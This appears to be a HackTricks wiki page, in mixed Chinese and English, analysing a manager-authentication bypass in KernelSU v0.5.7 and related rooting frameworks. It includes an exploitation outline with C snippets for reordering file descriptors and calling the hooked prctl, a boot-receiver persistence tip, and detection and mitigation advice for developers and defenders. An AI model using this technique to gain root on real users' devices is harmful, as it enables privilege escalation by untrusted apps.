# Android Rooting Frameworks (KernelSU/Magisk) Manager Auth Bypass & Syscall Hook Abuse

{{#include ../../banners/hacktricks-training.md}}

KernelSU、APatch、SKRoot 和 Magisk 等 Rooting frameworks 经常会对 Linux/Android kernel 进行 patch，并通过被 hook 的 syscall，向无特权 userspace 中的“manager” app 暴露 privileged functionality。如果 manager-authentication 步骤存在缺陷，任何 local app 都可以访问这一 channel，并在已经 Root 的设备上提升 privileges。

本页面抽象总结了 public research 中发现的 techniques 和 pitfalls（尤其是 Zimperium 对 KernelSU v0.5.7 的 analysis），帮助 red team 和 blue team 理解 attack surfaces、exploitation primitives 以及 robust mitigations。<sup>[[1]](#references)</sup>

---
## Architecture pattern: syscall-hooked manager channel

- Kernel module/patch hook 一个 syscall（通常是 prctl），用于接收来自 userspace 的“commands”。
- Protocol 通常为：magic_value、command_id、arg_ptr/len ...
- Userspace manager app 首先进行 authentication（例如 CMD_BECOME_MANAGER）。当 kernel 将 caller 标记为 trusted manager 后，才会接受 privileged commands：
- 向 caller 授予 root（例如 CMD_GRANT_ROOT）
- 管理 su 的 allowlists/deny-lists
- 调整 SELinux policy（例如 CMD_SET_SEPOLICY）
- 查询 version/configuration
- 由于任何 app 都可以调用 syscalls，因此 manager authentication 的正确性至关重要。

Example（KernelSU design）：
- Hooked syscall：prctl
- 用于将调用转发到 KernelSU handler 的 Magic value：0xDEADBEEF
- Commands 包括：CMD_BECOME_MANAGER、CMD_GET_VERSION、CMD_ALLOW_SU、CMD_SET_SEPOLICY、CMD_GRANT_ROOT 等。

---
## KernelSU v0.5.7 authentication flow（as implemented）

当 userspace 调用 prctl(0xDEADBEEF, CMD_BECOME_MANAGER, data_dir_path, ...) 时，KernelSU 会验证：

1) Path prefix check
- 提供的 path 必须以 caller UID 对应的 expected prefix 开头，例如 /data/data/<pkg> 或 /data/user/<id>/<pkg>。
- Reference：core_hook.c（v0.5.7）path prefix logic。<sup>[[2]](#references)</sup>

2) Ownership check
- 该 path 必须由 caller UID 所有。
- Reference：core_hook.c（v0.5.7）ownership logic。<sup>[[2]](#references)</sup>

3) 通过 FD table scan 进行 APK signature check
- 遍历 calling process 的 open file descriptors（FDs）。
- 选择第一个 path 匹配 /data/app/*/base.apk 的 file。
- 解析 APK v2 signature，并与 official manager certificate 进行验证。
- References：manager.c（iterating FDs）、apk_sign.c（APK v2 verification）。<sup>[[3]](#references)[[4]](#references)</sup>

如果所有 checks 都通过，kernel 会临时缓存 manager 的 UID，并接受来自该 UID 的 privileged commands，直到 reset。

---
## Vulnerability class：信任 FD iteration 中的“第一个匹配 APK”

如果 signature check 绑定的是从 process FD table 中找到的“第一个匹配 /data/app/*/base.apk”，那么它实际上并没有验证 caller 自己的 package。Attacker 可以预先放置一个合法签名的 APK（真实 manager 的 APK），使其在 FD list 中早于 attacker 自己的 base.apk 出现。

这种 trust-by-indirection 使 unprivileged app 无需拥有 manager 的 signing key，即可 impersonate manager。<sup>[[1]](#references)</sup>

被利用的关键 properties：<sup>[[1]](#references)</sup>
- FD scan 不会将结果绑定到 caller 的 package identity；它只会对 path strings 进行 pattern-matching。
- open() 会返回当前可用的最低 FD。通过先关闭较低编号的 FDs，attacker 可以控制 ordering。
- Filter 只检查 path 是否匹配 /data/app/*/base.apk，而不会检查它是否对应 caller 的 installed package。

---
## Attack preconditions

- Device 已经通过存在 vulnerability 的 Rooting framework（例如 KernelSU v0.5.7）Root。
- Attacker 可以在本地运行任意 unprivileged code（Android app process）。
- Real manager 尚未完成 authentication（例如刚 reboot 后）。某些 frameworks 会在成功后 cache manager UID；因此你必须赢得 race。<sup>[[1]](#references)</sup>

---
## Exploitation outline（KernelSU v0.5.7）

High-level steps：<sup>[[1]](#references)[[9]](#references)</sup>
1) 构造指向你自己的 app data directory 的有效 path，以满足 prefix 和 ownership checks。
2) 确保 genuine KernelSU Manager base.apk 在低编号 FD 上打开，并且该 FD 低于你自己的 base.apk。
3) 调用 prctl(0xDEADBEEF, CMD_BECOME_MANAGER, <your_data_dir>, ...)，通过 checks。
4) 执行 CMD_GRANT_ROOT、CMD_ALLOW_SU、CMD_SET_SEPOLICY 等 privileged commands，以持久化 elevation。

关于第 2 步（FD ordering）的 practical notes：<sup>[[1]](#references)</sup>
- 通过遍历 /proc/self/fd symlinks，定位 process 中属于你自己的 /data/app/*/base.apk 的 FD。
- 关闭一个低编号 FD（例如 stdin，即 fd 0），然后先打开 legitimate manager APK，使其占用 fd 0（或任何低于你自己的 base.apk fd 的 index）。
- 将 legitimate manager APK 与你的 app 一起 bundle，使其 path 满足 kernel 的 naive filter。例如，将其放在匹配 /data/app/*/base.apk 的 subpath 下。

Example code snippets（Android/Linux，仅作说明）：

枚举 open FDs，以定位 base.apk entries：
```c
#include <dirent.h>
#include <stdio.h>
#include <unistd.h>
#include <string.h>

int find_first_baseapk_fd(char out_path[PATH_MAX]) {
DIR *d = opendir("/proc/self/fd");
if (!d) return -1;
struct dirent *e; char link[PATH_MAX]; char p[PATH_MAX];
int best_fd = -1;
while ((e = readdir(d))) {
if (e->d_name[0] == '.') continue;
int fd = atoi(e->d_name);
snprintf(link, sizeof(link), "/proc/self/fd/%d", fd);
ssize_t n = readlink(link, p, sizeof(p)-1);
if (n <= 0) continue; p[n] = '\0';
if (strstr(p, "/data/app/") && strstr(p, "/base.apk")) {
if (best_fd < 0 || fd < best_fd) {
best_fd = fd; strncpy(out_path, p, PATH_MAX);
}
}
}
closedir(d);
return best_fd; // First (lowest) matching fd
}
```
强制一个编号较低的 FD 指向合法的 manager APK：
```c
#include <fcntl.h>
#include <unistd.h>

void preopen_legit_manager_lowfd(const char *legit_apk_path) {
// Reuse stdin (fd 0) if possible so the next open() returns 0
close(0);
int fd = open(legit_apk_path, O_RDONLY);
(void)fd; // fd should now be 0 if available
}
```
通过 prctl hook 实现 Manager 认证：
```c
#include <sys/prctl.h>
#include <stdint.h>

#define KSU_MAGIC          0xDEADBEEF
#define CMD_BECOME_MANAGER 0x100  // Placeholder; command IDs are framework-specific

static inline long ksu_call(unsigned long cmd, unsigned long arg2,
unsigned long arg3, unsigned long arg4) {
return prctl(KSU_MAGIC, cmd, arg2, arg3, arg4);
}

int become_manager(const char *my_data_dir) {
long result = -1;
// arg2: command, arg3: pointer to data path (userspace->kernel copy), arg4: optional result ptr
result = ksu_call(CMD_BECOME_MANAGER, (unsigned long)my_data_dir, 0, 0);
return (int)result;
}
```
成功后，特权命令（示例）：
- CMD_GRANT_ROOT: 将当前进程提升为 root
- CMD_ALLOW_SU: 将你的 package/UID 添加到 allowlist，以持久化 su
- CMD_SET_SEPOLICY: 根据 framework 支持的功能调整 SELinux policy

Race/持久化提示：
- 在 AndroidManifest 中注册 BOOT_COMPLETED receiver（RECEIVE_BOOT_COMPLETED），以便在重启后尽早启动，并在真正的 manager 之前尝试进行认证。<sup>[[1]](#references)</sup>

---
## Detection 和 mitigation 指南

对于 framework 开发者：
- 将认证绑定到调用者的 package/UID，而不是任意 FD：
- 从 UID 解析调用者的 package，并通过 PackageManager 根据已安装 package 的签名进行验证，而不是扫描 FD。
- 如果仅依赖 kernel，则使用稳定的调用者身份（task creds），并通过由 init/userspace helper 管理的稳定事实来源进行验证，而不是使用进程 FD。
- 避免使用 path-prefix 检查作为身份标识；调用者可以轻易满足此条件。
- 在 channel 上使用基于 nonce 的 challenge–response，并在 boot 或关键事件发生时清除任何缓存的 manager 身份。
- 在可行时，考虑使用基于 binder 的 authenticated IPC，而不是将通用 syscall 用作额外功能。

对于 defenders/blue team：
- 检测 rooting frameworks 和 manager 进程；如果拥有 kernel telemetry，则监控带有可疑 magic constants（例如 0xDEADBEEF）的 prctl 调用。
- 在受管控的设备群中，阻止或对不受信任 package 的 boot receivers 发出警报，尤其是它们在 post-boot 后快速尝试特权 manager 命令时。
- 确保设备已更新到修复漏洞的 framework 版本；在更新时使缓存的 manager ID 失效。

攻击的限制：
- 仅影响已经通过存在漏洞的 framework 获取 root 的设备。
- 通常需要在合法 manager 完成认证之前利用 reboot/race 窗口（某些 frameworks 会一直缓存 manager UID，直到被重置）。

---
## 各 framework 的相关说明

- 基于密码的 auth（例如历史版本的 APatch/SKRoot builds）可能存在弱点：密码可被猜测或暴力破解，或者 validation 存在 bug。<sup>[[1]](#references)[[6]](#references)[[7]](#references)</sup>
- 基于 package/signature 的 auth（例如 KernelSU）原则上更强，但必须绑定到实际调用者，而不是依赖 FD 扫描等间接 artefacts。<sup>[[1]](#references)[[5]](#references)</sup>
- Magisk：CVE-2024-48336 (MagiskEoP) 表明，即使是成熟的生态系统，也可能受到 identity spoofing 影响，进而在 manager context 内以 root 权限执行 code。<sup>[[1]](#references)[[8]](#references)</sup>

---
## References

- [1] [Zimperium – The Rooting of All Evil: Security Holes That Could Compromise Your Mobile Device](https://zimperium.com/blog/the-rooting-of-all-evil-security-holes-that-could-compromise-your-mobile-device)
- [2] [KernelSU v0.5.7 – core_hook.c path checks (L193, L201)](https://github.com/tiann/KernelSU/blob/v0.5.7/kernel/core_hook.c#L193)
- [3] [KernelSU v0.5.7 – manager.c FD iteration/signature check (L43+)](https://github.com/tiann/KernelSU/blob/v0.5.7/kernel/manager.c#L43)
- [4] [KernelSU – apk_sign.c APK v2 verification (main)](https://github.com/tiann/KernelSU/blob/main/kernel/apk_sign.c#L319)
- [5] [KernelSU project](https://kernelsu.org/)
- [6] [APatch](https://github.com/bmax121/APatch)
- [7] [SKRoot](https://github.com/abcz316/SKRoot-linuxKernelRoot)
- [8] [MagiskEoP – CVE-2024-48336](https://github.com/canyie/MagiskEoP)
- [9] [KSU PoC demo video (Wistia)](https://zimperium-1.wistia.com/medias/ep1dg4t2qg?videoFoam=true)

{{#include ../../banners/hacktricks-training.md}}
